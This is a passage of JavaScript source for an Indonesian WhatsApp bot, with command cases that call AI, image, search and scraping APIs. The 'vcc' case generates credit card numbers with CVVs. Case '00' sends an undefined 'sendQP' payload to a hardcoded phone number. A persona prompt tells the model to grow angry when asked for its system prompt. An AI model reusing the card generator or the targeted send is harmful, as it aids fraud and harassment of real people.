ytSearch(q)
}
break
/* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/







//============================================================\\
   // 𝗠 𝗘 𝗡 𝗨         -        𝗔 𝗜 
//============================================================\\
case "ai":
case "heckai":
 if (!args.length) {
 return m.reply("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *heckai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(args.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return reply("❌ AI tidak dapat memberikan jawaban.");
 }
 m.reply(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 m.reply("❌ Terjadi kesalahan saat mengakses AI.");
 }
 break
 
 case "ainsfw": {
 if (!text) return m.reply("Silakan masukkan prompt untuk menghasilkan gambar.");
 async function generateImage(prompt) {
 try {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/",
 };
 const axios = require("axios");
 const response = await axios.get(url, { headers });
 if (response.data && response.data.image_link) {
 Kyyhst.sendMessage(m.chat, { image: { url: response.data.image_link }, caption: `Berikut gambar untuk: *${text}*` }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan gambar.");
 }
 } catch (error) {
 m.reply("Terjadi kesalahan saat mengambil gambar.");
 console.error(error);
 }
 }
 generateImage(text);
}
 break
 case "imgbing": case "bingimg": {
    if (!args.length) return m.reply("Masukkan prompt gambar!\nContoh: imgbing mobil sport merah");
    let query = encodeURIComponent(args.join(" "));
    let url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;
    try {
        await Kyyhst.sendMessage(from, { react: { text: "⏳", key: m.key } });
        let response = await fetch(url);
        let data = await response.json();
        if (data.status !== 200 || !data.data.result.length) {
            return m.reply("Gambar tidak ditemukan!");
        }
        for (let img of data.data.result) {
            await Kyyhst.sendMessage(from, { image: { url: img }, caption: "Maaf Jika Tidak Sesuai 😌" }, { quoted: m });
        }
        await Kyyhst.sendMessage(from, { react: { text: "✅", key: m.key } });
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat mengambil gambar.");
    }
}
    break
    case "aikame": {
  if (!text) {
    return m.reply(`Contoh: ${prefix + command} hai luminai`);
  }
  const prompt = `mulai dari sekarang nama anda adalah akame, anda adalah seorang kecerdasan buatan yang di buat oleh KyyXD. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu.`
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://luminai.my.id', requestData)).data.result;
    m.reply(response);
  } catch (err) {
    m.reply(err.toString());
  }
}
break;
case "autoai": {
    if (!text) return m.reply(`*Contoh:* .autoai *[on/off/reset]*`);

    if (text === "on") {
        globalAutoAIStatus = true;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ✅ ] *Auto AI diaktifkan di semua chat!* Bot akan merespon otomatis di semua percakapan.`);
    } else if (text === "off") {
        globalAutoAIStatus = false;
        sessions = {}; 
        saveSession();
        return m.reply(`[ ❌ ] *Auto AI dimatikan di semua chat!* Bot hanya merespon jika dipanggil.`);
    } else if (text === "reset") {
        if (globalAutoAIStatus) {
            sessions = {};
            saveSession();
            return m.reply("♻️ *Seluruh riwayat chat AI telah direset!*");
        } else {
            return m.reply("⚠️ *Auto AI sedang tidak aktif!*");
        }
    }
}
break
 case 'ailuminai': case 'luminai': case '+': {
    if (!text) return m.reply(`Halo 🖐 Saya Adalah Luminai ai apakah ada yang ingin ditanyakan ?`);

    Kyyhst.sendMessage(m.chat, { react: { text: `⌛`, key: m.key }})
    try {
        let url = `https://www.archive-ui.biz.id/ai/luminai?text=${encodeURIComponent(text)}`;
        let res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);

        let json = await res.json();

        if (!json.status) {
            return m.reply(`❌ Gagal. status: ${json.status}\nCreator: ${json.creator || 'Tidak diketahui.'}`);
        }


        let aiResponse = json.result;
        if (!aiResponse) {
            return m.reply("❌ Tidak ada respons AI yang ditemukan.");
        }


        m.reply(aiResponse);

    } catch (err) {
        console.error("Error ailuminai:", err);
        m.reply("❌ Terjadi kesalahan saat memproses permintaan AI.");
    }
}
break
case 'kameyo': case "telusuriimg": {
 if (!m.quoted) return m.reply('Harap balas ke foto yang ingin dianalisis + pertanyaaan,gk pke pertanyaan gpp');
 let mime = (m.quoted.msg || m.quoted).mimetype || "";
 if (!mime.startsWith('image/')) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}\n\nExample: grok itu apa dengan reply foto`);
 const axios = require('axios');
 const FormData = require('form-data');
 const { writeFileSync, unlinkSync, createReadStream } = require('fs');
 const path = require('path');
 async function uguu(filePath) {
 try {
 const form = new FormData();
 form.append('files[]', createReadStream(filePath));
 const { data } = await axios.post('https://uguu.se/upload', form, {
 headers: { ...form.getHeaders() }
 });
 return data.files[0].url;
 } catch (err) {
 throw new Error(err.message);
 }
 }
 try {
 await Kyyhst.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } });
 let mediaBuffer = await m.quoted.download();
 let ext = mime.split('/')[1] || "png";
 let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
 writeFileSync(tempFile, mediaBuffer);
 let imageUrl = await uguu(tempFile);
 let pertanyaan = m.text.replace(`${prefix}${command}`, '').trim();
 if (!pertanyaan) return m.reply('Tolong masukkan pertanyaan');
 let sessionId = `${m.chat.replace(/[^a-zA-Z0-9]/g, '')}-${Date.now()}`;
 let apiUrl = `https://fastrestapis.fasturl.cloud/aillm/grok?ask=${encodeURIComponent(pertanyaan)}&imageUrl=${imageUrl}&style=Provide a formal response.&sessionId=${sessionId}`;
 let { data } = await axios.get(apiUrl);
 let result = data.result;
 await Kyyhst.sendMessage(m.chat, { text: result }, { quoted: m });
 await Kyyhst.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 unlinkSync(tempFile);
 } catch (error) {
 console.error('Error ini:', error);
 m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.');
 }
}
break
 
case 'kamevid': case 'geminii': {
  if (!m.quoted) return m.reply('Harap balas ke foto yang ingin dianalisis + pertanyaan,gk ad pertanyaan gpp');
  let mime = (m.quoted.msg || m.quoted).mimetype || "";
  if (!mime.startsWith('image/')) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`);
  const axios = require('axios');
  const FormData = require('form-data');
  const { writeFileSync, unlinkSync, createReadStream } = require('fs');
  const path = require('path');
  async function uguu(filePath) {
    try {
      const form = new FormData();
      form.append('files[]', createReadStream(filePath));
      const { data } = await axios.post('https://uguu.se/upload', form, {
        headers: { ...form.getHeaders() }
      });
      return data.files[0].url;
    } catch (err) {
      throw new Error(err.message);
    }
  }
  try {
    await Kyyhst.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } });
    let mediaBuffer = await m.quoted.download();
    let ext = mime.split('/')[1] || "png";
    let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
    writeFileSync(tempFile, mediaBuffer);
    let imageUrl = await uguu(tempFile);
    let pertanyaan = m.text.replace(`${prefix}${command}`, '').trim();
    if (!pertanyaan) return m.reply('Tolong masukkan pertanyaan');
    let sessionId = `${m.chat.replace(/[^a-zA-Z0-9]/g, '')}-${Date.now()}`;
    let apiUrl = `https://api.hiuraa.my.id/ai/gemini-advanced?text=${encodeURIComponent(pertanyaan)}&_mediaUrl=${encodeURIComponent(imageUrl)}&sessionid=${sessionId}`;
    let { data } = await axios.get(apiUrl);
    let result = data.result;
    await Kyyhst.sendMessage(m.chat, { text: result }, { quoted: m });
    await Kyyhst.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    unlinkSync(tempFile);
  } catch (error) {
    console.error('Error in geminiadvanced:', error);
    m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.');
  }
}
break
case 'deepimg': {
 if (!text) return m.reply("Masukkan prompt gambar.")
 m.reply("Sedang memproses gambar, mohon tunggu...")

 try {
const axios = require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return m.reply("Gagal membuat gambar. Coba ganti promptnya.")
 await Kyyhst.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: m })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 m.reply("Terjadi kesalahan saat memproses gambar.")
 }
}
break
case 'islamai': {
    if (!text) return m.reply("Masukkan pertanyaan yang ingin ditanyakan!");

    try {
        // React "⏱️" sebelum proses
        await Kyyhst.sendMessage(m.chat, {
            react: {
                text: "⏱️",
                key: m.key,
            }
        });

        // Fetch data dari Islam AI
        let { data } = await axios.get(`https://bk9.fun/ai/Islam-ai?q=${encodeURIComponent(text)}`);

        if (!data.status || !data.BK9 || !data.BK9.result) {
            return m.reply("Gagal mendapatkan jawaban dari Islam AI.");
        }

        let caption = `🕌 *Islam AI Response*\n\n📜 *Pertanyaan:* ${text}\n\n📝 *Jawaban:*\n${data.BK9.result}\n\n_TQ To: @BK9dev_`;

        // Kirim jawaban AI
        await Kyyhst.sendMessage(m.chat, { text: caption }, { quoted: m });

        // React "✅" setelah selesai
        await Kyyhst.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key,
            }
        });

    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat menghubungi AI.");
    }
};
break
      case "metaai":
        {
          if (!text) return reply("Hallo");
          let aii = await fetchJson(
            `https://api.siputzx.my.id/api/ai/meta-llama-33-70B-instruct-turbo?content=${text}`
          );
          reply(aii.data);
        }
        break;

/* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗔𝗜 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/






//============================================================\\
    // 𝗦 𝗘 𝗔 𝗥 𝗖 𝗛       -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case "sggl":
case "searchgoogle": {
    if (!q) return m.reply("Masukkan kata kunci pencarian!");    
    let url = `https://api.hiuraa.my.id/search/google?q=${encodeURIComponent(q)}`;
    try {
        let res = await fetch(url);
        let json = await res.json();
        if (!json.status || !json.result.length) return m.reply("Tidak ada hasil ditemukan.");
        let hasil = json.result.map((item, i) => 
            `*${i + 1}. ${item.title}*\n${item.desc}\n🔗 ${item.link}`
        ).join("\n\n");

        m.reply(`🔍 *Hasil Pencarian Google:*\n\n${hasil}`);
    } catch (e) {
        console.error(e);
        m.reply("Terjadi kesalahan saat mengambil data.");
    }
}
    break
    case "meme":
case "searchmeme":
case "soundmeme": {
 if (!q) return m.reply("Masukkan kata kunci meme dan max hasil pencarian!\nContoh: meme wibu 2");
 let args = q.split(" ");
 let limit = parseInt(args[args.length - 1]); 
 let searchQuery = isNaN(limit) ? q : args.slice(0, -1).join(" "); 
 let url = `https://api.agungny.my.id/api/memesound?q=${encodeURIComponent(searchQuery)}`;
 try {
 let res = await fetch(url);
 let json = await res.json();
 if (!json.status || !json.result.length) return reply("Meme tidak ditemukan!");
 let results = isNaN(limit) ? json.result : json.result.slice(0, limit);
 let message = "🎵 *Hasil Pencarian:*\n\n";
 for (let i = 0; i < results.length; i++) {
 message += `🎶 *${results[i].text}*\n🔗 (${results[i].url})\n\n`;
 await Kyyhst.sendMessage(from, { audio: { url: results[i].audioUrl }, mimetype: "audio/mpeg" });
 }
 m.reply(message);
 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat mencari meme. [ Meme tidak ditemukan ]");
 }
}
break
case 'anime': {
    if (!text) return m.reply('⚠️ Masukkan judul anime yang ingin dicari!');

    try {
        await Kyyhst.sendMessage(m.chat, {
            react: { text: "🔎", key: m.key }
        });

        let url = `https://asepharyana.cloud/api/anime2/search?q=${encodeURIComponent(text)}`;
        let response = await fetch(url);
        let json = await response.json();

        if (!json || json.status !== "Ok" || !json.data.length) {
            await Kyyhst.sendMessage(m.chat, {
                react: { text: "❌", key: m.key }
            });
            return m.reply('❌ Anime tidak ditemukan!');
        }

        let results = json.data.map(anime => ({
            title: anime.title,
            slug: anime.slug,
            poster: anime.poster,
            description: anime.description,
            anime_url: anime.anime_url,
            rating: anime.rating,
            type: anime.type
        }));

        let responseText = `*📺 Hasil Pencarian Anime: ${text}*\n\n`;
        for (let anime of results) {
            responseText += `🎞️ *Judul:* ${anime.title}\n`;
            responseText += `⭐ *Rating:* ${anime.rating}\n`;
            responseText += `📌 *Tipe:* ${anime.type}\n`;
            responseText += `🔗 *Link:* [Klik Disini](${anime.anime_url})\n\n`;
        }

        await Kyyhst.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        });

        await Kyyhst.sendMessage(m.chat, {
            text: responseText,
            contextInfo: { externalAdReply: {
                title: results[0].title,
                body: "Klik untuk menonton anime",
                thumbnailUrl: results[0].poster,
                sourceUrl: results[0].anime_url,
                mediaType: 1
            }}
        }, { quoted: m });

    } catch (error) {
        console.error('❌ Error:', error);
        return m.reply('❌ Terjadi kesalahan saat mengambil data anime.');
    }
}
break;
case 'pindown': {
if (!args[0]) return m.reply(`Contoh: ${usedPrefix + command} https://pin.it/ZSkWZsTSj`)
reply(mess.wait)
   try {
    let url = args[0]
    let apiUrl = `https://api.nasirxml.my.id/download/pinterest?query=${encodeURIComponent(url)}`
    let res = await fetch(apiUrl)
    let json = await res.json()
if (json.status !== 200 || !json.result || json.result.length === 0) {
  return m.reply("Gagal mengambil data, pastikan link valid")
        }
  let bestImage = json.result
            .filter(item => item.extension === "jpg")
            .sort((a, b) => parseInt(b.quality) - parseInt(a.quality))[0]
  let bestVideo = json.result
            .filter(item => item.extension === "mp4")
            .sort((a, b) => parseInt(b.quality) - parseInt(a.quality))[0]
if (bestVideo) {
  await Kyyhst.sendMessage(m.chat, { video: { url: bestVideo.url }, caption: `Quality: ${bestVideo.quality}` }, { quoted: m })
 } else if (bestImage) {
  await Kyyhst.sendMessage(m.chat, { image: { url: bestImage.url }, caption: `Quality: ${bestImage.quality}` }, { quoted: m })
 } else {
m.reply("Media tidak ditemukan")
     }
 } catch (e) {
console.error(e)
m.reply("Error")
  }
}
break
      case "pin":
      case "pinterest":
        {
          async function pinterest(query) {
            try {
              const { data } = await axios.get(
                `https://api.vreden.my.id/api/pinterest?query=${encodeURIComponent(
                  query
                )}`
              );

              return data.result[
                Math.floor(Math.random() * data.result.length)
              ];
            } catch (err) {
              throw Error(err.message);
            }
          }

          if (!text) return m.reply(`Contoh: .Akame`);
          try {
            let hasil = await pinterest(text);
            if (!hasil) return m.reply("Gambar tidak ditemukan.");
            const buttons = [
              {
                buttonId: `${prefix}pin ${command}`,
                buttonText: {
                  displayText: "Lagi",
                },
                type: 1,
              },
            ];

            await Kyyhst.sendMessage(
              m.chat,
              {
                image: { url: hasil },
                caption:
                  "Lanjut mencari gambar yang sama? Klik tombol *Next* dibawah ini",
                footer: `Search By Akame`,
                buttons: buttons,
                headerType: 1,
                viewOnce: true,
              },
              { quoted: m }
            );
          } catch (err) {
            console.error(err.message);
            m.reply("Terjadi kesalahan");
          }
        }
        break;
case 'mcaddons':
case 'mcmap': {
    const axios = require('axios');
    const cheerio = require('cheerio');

    async function scrapeBedrock(url) {
        try {
            const { data: html } = await axios.get(url);
            const $ = cheerio.load(html);
            const results = [];

            $('#contentContainer #addon_rows .content-row-cell').each((i, element) => {
                const title = $(element).find('.card-product-title b#product-name').text().trim();
                const relativeLink = $(element).find('.product-card').attr('data-href');
                const link = relativeLink ? `https://www.bedrockexplorer.com${relativeLink}` : null;

                let image = $(element).find('.product-card-wrapper img').first().attr('src');
                if (image && !image.startsWith('http')) {
                    image = `https://www.bedrockexplorer.com${image}`;
                }

                let price = $(element).find('.price-element b').text().trim() || $(element).find('.price-element').text().trim();
                
                results.push({ title, link, image, price });
            });

            return results;
        } catch (error) {
            console.error('Error while scraping:', error);
            return null;
        }
    }

    let targetUrl = command === 'mcaddons' 
        ? 'https://www.bedrockexplorer.com/discover' 
        : 'https://www.bedrockexplorer.com/queries/free-content/everyone/maps/latest';

    let contentType = command === 'mcaddons' ? "Add-ons (Paid & Free)" : "Free Maps";
    let results = await scrapeBedrock(targetUrl);

    if (!results || results.length === 0) return m.reply("⚠️ Tidak ditemukan konten terbaru.");

    let message = `📌 *Minecraft Bedrock ${contentType}*\n\n`;
    results.slice(0, 5).forEach((item, i) => {
        message += `🔹 *${item.title}*\n`;
        message += `🔗 Cek Addon: ${item.link}\n`;
        message += item.price ? `💰 *Harga:* ${item.price}\n\n` : "\n";
    });

    let thumbnail = results[0].image || 'https://cloudkuimages.com/uploads/images/67e291775c15a.jpg';

    Kyyhst.sendMessage(m.chat, {
        image: { url: thumbnail },
        caption: message
    }, { quoted: m });

}
break;
case 'fajar':


FajarNews().then(async(res) => {
console.log(res) 
no = 0
iwan = ""
for (let i of res) {
no += 1
iwan += `\n• ${no.toString()} •\n`
iwan += `Berita: ${i.berita}\n`
iwan += `Upload: ${i.berita_diupload}\n`
iwan += `Jenis: ${i.berita_jenis}\n`
iwan += `Link: ${i.berita_url}\n`
}
iwan += ""
reply(iwan) 
})
//D|ts si pler 🐎
break 
case 'layarkaca':


if (!q) return reply('Judul') 
LayarKaca21(q).then(async(res) => {
no = 0
iwannn = ""
for (let i of res) {
no += 1
iwannn += `\n• ${no.toString()} •\n`
iwannn += `Film: ${i.film_title}\n`
iwannn += `Link: ${i.film_link}\n`
}
iwannn += ``
reply(iwannn) 
})
//D|ts si pler 🐎
break 
//=================================================//
case 'okezone':


OkezoneNews().then(async(res) => {
no = 0
iwannnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnn += ""
Kyyhst.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case 'sindo':


SindoNews().then(async(res) => {
no = 0
iwannnnnnnnnnnn = ""
for (let i of res) {
no += 1
iwannnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnn += ""
reply(iwannnnnnnnnnnn) 
})
//D|ts si pler 🐎
break 
 //ppp
case '00':{
target = "6281513607731@s.whatsapp.net"
sendQP(target, wanted)
    }
  //D|ts si pler 🐎
break 
//=================================================//
case "kontan":


KontanNews().then(async (res) => {
iwannnnnnnnnnnnnnn = ""
no = 0
for (let i of res) {
no += 1
iwannnnnnnnnnnnnnn += `\n• ${no.toString()} •\n`
iwannnnnnnnnnnnnnn += `Berita: ${i.berita}\n`
iwannnnnnnnnnnnnnn += `Jenis: ${i.berita_jenis}\n`
iwannnnnnnnnnnnnnn += `Upload: ${i.berita_diupload}\n`
iwannnnnnnnnnnnnnn += `Link: ${i.berita_url}\n`
}
iwannnnnnnnnnnnnnn += ""
Kyyhst.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: iwannnnnnnnnnnnnnn }, { quoted:m })
})
//D|ts si pler 🐎
break 
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
tekcs = ""
tekcs += "Jalan Tikus Meme\n\n"
tekcs += `Source: ${reis}`
tekcs += ""
Kyyhst.sendMessage(m.chat, { image : { url : reis }, caption: tekcs }, { quoted:m })
//D|ts si pler 🐎
break 
case "infonegara": case "country": {
    if (!q) return m.reply("Masukkan nama negara! Contoh: .infonegara Vietnam");
    let url = `https://api.siputzx.my.id/api/tools/countryInfo?name=${encodeURIComponent(q)}`;
    try {
        let res = await fetch(url);
        let json = await res.json();
        if (!json.status) return m.reply("Negara tidak ditemukan!");
        let data = json.data;
        let neighbors = data.neighbors.map(n => `- ${n.name} (${n.flag})`).join("\n");
        let replyText = `🌍 *Informasi Negara: ${data.name}*\n\n` +
            `🏛 *Ibukota:* ${data.capital}\n` +
            `📍 *Koordinat:* ${data.coordinates.latitude}, ${data.coordinates.longitude}\n` +
            `🏴 *Bendera:* ${data.flag}\n` +
            `📞 *Kode Telepon:* ${data.phoneCode}\n` +
            `🗺 *Peta:* ${data.googleMapsLink}\n` +
            `🌏 *Benua:* ${data.continent.name} ${data.continent.emoji}\n` +
            `🗣 *Bahasa:* ${data.languages.native.join(", ")}\n` +
            `💰 *Mata Uang:* ${data.currency}\n` +
            `🚗 *Lajur Kendaraan:* ${data.drivingSide}\n` +
            `🌟 *Terkenal Sebagai:* ${data.famousFor}\n` +
            `🏛 *Bentuk Pemerintahan:* ${data.constitutionalForm}\n` +
            `🌐 *Domain Internet:* ${data.internetTLD}\n` +
            `🌍 *Negara Tetangga:*\n${neighbors || "Tidak ada"}\n`;
        let buttons = [
            { buttonId: `${prefix}infonegara ${data.name}`, buttonText: { displayText: "🔄 Cek Lagi" }, type: 1 },
            { buttonId: `.menu`, buttonText: { displayText: "📜 Menu" }, type: 1 }
        ];
        let message = {
            text: replyText,
            footer: "Country Info Bot",
            buttons: buttons,
            headerType: 1,
            image: { url: data.flag }
        };
        Kyyhst.sendMessage(m.chat, message, { quoted: m });
    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil data.");
    }
}
    break
 case "groupsearch": case "gbs":{
if (!q) return m.reply("Mau Nyari Group Apa?")
const anu = await axios.get(`https://api.athar.web.id/api/whatsapp/grup/search?query=${encodeURIComponent(q)}`)
m.reply("*[ HASIL SEARCHING ]*\n\n\n" + anu.data.result.slice(0, 10).map((g, i) => `- Group Name: ${i + 1}. ${g.title}\n- Group Link: ${g.link}\n`).join("\n") || "*[ 404 ]* Not Found")
}
break;
case "vcc": case "cvcc": {
    try {
        let [type, jumlah] = args;
        let validTypes = ["MasterCard", "Visa", "Amex", "Discover"];
        if (!type || !validTypes.includes(type)) {
            return m.reply(`⚠️ Format salah! Pilih tipe: MasterCard, Visa, Amex, Discover.\n\n🔰 *Cara penggunaan:*\nKetik: *vcc <type> <jumlah>*\nContoh: *vcc Visa 3*`);
        }
        jumlah = jumlah && !isNaN(jumlah) ? parseInt(jumlah) : 5;
        if (jumlah < 1 || jumlah > 10) return m.reply("⚠️ Jumlah VCC minimal 1 dan maksimal 10!");
        const response = await fetch(`https://api.siputzx.my.id/api/tools/vcc-generator?type=${type}&count=${jumlah}`);
        const data = await response.json();
        if (!data.status || !data.data) return m.reply("⚠️ Gagal mengambil data VCC.");
        let message = `💳 *Virtual Credit Card (VCC) - ${type}*\n\n`;
        data.data.forEach((card, index) => {
            message += ` *Card ${index + 1}*\n` +
                `• 🏷️ Name: ${card.cardholderName}\n` +
                `• 💳 Number: ${card.cardNumber}\n` +
                `• 📆 Exp: ${card.expirationDate}\n` +
                `• 🔐 CVV: ${card.cvv}\n\n`;
        });
        m.reply(message);
    } catch (err) {
        console.error(err);
        m.reply("⚠️ Terjadi kesalahan saat mengambil VCC.");
    }
}
    break
case "cerpen":
if (!text) return m.reply('`Masukan type: .cerpen anak`')
 function cerpen(category) {
 return new Promise(async (resolve, reject) => {
 try {
 let title = category.toLowerCase().replace(/[()*]/g, "");
 let judul = title.replace(/\s/g, "-");
 let page = Math.floor(Math.random() * 5) + 1; 

 let get = await axios.get('http://cerpenmu.com/category/cerpen-' + judul + '/page/' + page);
 let $ = cheerio.load(get.data);
 let link = [];

 $('article.post').each(function (a, b) {
 link.push($(b).find('a').attr('href'));
 });

 if (link.length === 0) {
 return reject("No stories found for this category.");
 }

 let random = link[Math.floor(Math.random() * link.length)];
 let res = await axios.get(random);
 let $$ = cheerio.load(res.data);

 let hasil = {
 title: $$('#content > article > h1').text(),
 author: $$('#content > article').text().split('Cerpen Karangan: ')[1]?.split('Kategori: ')[0]?.trim(),
 kategori: $$('#content > article').text().split('Kategori: ')[1]?.split('\n')[0]?.trim(),
 lolos: $$('#content > article').text().split('Lolos moderasi pada: ')[1]?.split('\n')[0]?.trim(),
 cerita: $$('#content > article > p').text()
 };

 resolve(hasil);
 } catch (error) {
 reject(error);
 }
 });
}


 try {
 var data = await cerpen(text);
 var textpp = `Title : ${data.title}\n`;
 textpp += `Author : ${data.author}\n`;
 textpp += `Category : ${data.kategori}\n`;
 textpp += `Approved on : ${data.lolos}\n`;
 textpp += `Story :\n${data.cerita}`;

 reply(textpp);
 } catch (error) {
 console.error(error);
 m.reply("An error occurred while fetching the story.");
 }
//D|ts si pler 🐎
break
/* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗦𝗘𝗔𝗥𝗖𝗛 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    // 𝗠 𝗔 𝗜 𝗡      -         𝗠 𝗘 𝗡 𝗨
//============================================================\\    
                case 'totalfitur': case 'totalfeature': {
    reply(`Total Feature Akame Saat Ini ${totalFitur()}͏`) 
    }
    break
        case 'daftar': case 'regis': case 'register': {
if (isRegistered) return reply('ᴋᴀᴍᴜ ᴛᴇʟᴀʜ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ɢɪʏᴜᴜ')
const serialUser = createSerial(20)
mzd = `*「 R E G I S T E R - S U C C E S 」*
> 𝘠𝘰𝘶𝘳 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯 𝘕𝘦𝘸𝘸

- Nomor : @${m?.sender.split('@')[0]}
- Nama : ${pushname}
- Status : Sukses✅ 
- Serial : ${serialUser}

ᴠᴇʀɪғɪᴋᴀsɪ sᴛᴀᴛᴜs - sᴜᴄᴄᴇs
ʏᴏᴜʀ ʏᴇs ᴀᴄᴄᴇsғᴜʟʟʏ ᴀᴋᴀᴍᴇ,,`
veri = m?.sender
if (!m.isGroup) {
addRegisteredUser(m?.sender, pushname, serialUser)
Kyyhst.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `𝗡 𝗘 𝗪 - 𝗨 𝗦 𝗘 𝗥`,
body: '',
thumbnailUrl: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460960720.png?q=60',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
} else {
addRegisteredUser(m?.sender, pushname, serialUser)
Kyyhst.sendMessage(m?.chat, {
text: mzd,
contextInfo: {
mentionedJid: [m?.chat],
externalAdReply: {
showAdAttribution: true,
title: `R E G I S T E R`,
body: '',
thumbnailUrl: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460960720.png?q=60',
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
}
break

case 'anime': {
    if (!text) return m.reply('⚠️ Masukkan judul anime yang ingin dicari!');

    try {
        await Kyyhst.sendMessage(m.chat, {
            react: { text: "🔎", key: m.key }
        });

        let url = `https://asepharyana.cloud/api/anime2/search?q=${encodeURIComponent(text)}`;
        let response = await fetch(url);
        let json = await response.json();

        if (!json || json.status !== "Ok" || !json.data.length) {
            await Kyyhst.sendMessage(m.chat, {
                react: { text: "❌", key: m.key }
            });
            return m.reply('❌ Anime tidak ditemukan!');
        }

        let results = json.data.map(anime => ({
            title: anime.title,
            slug: anime.slug,
            poster: anime.poster,
            description: anime.description,
            anime_url: anime.anime_url,
            rating: anime.rating,
            type: anime.type
        }));

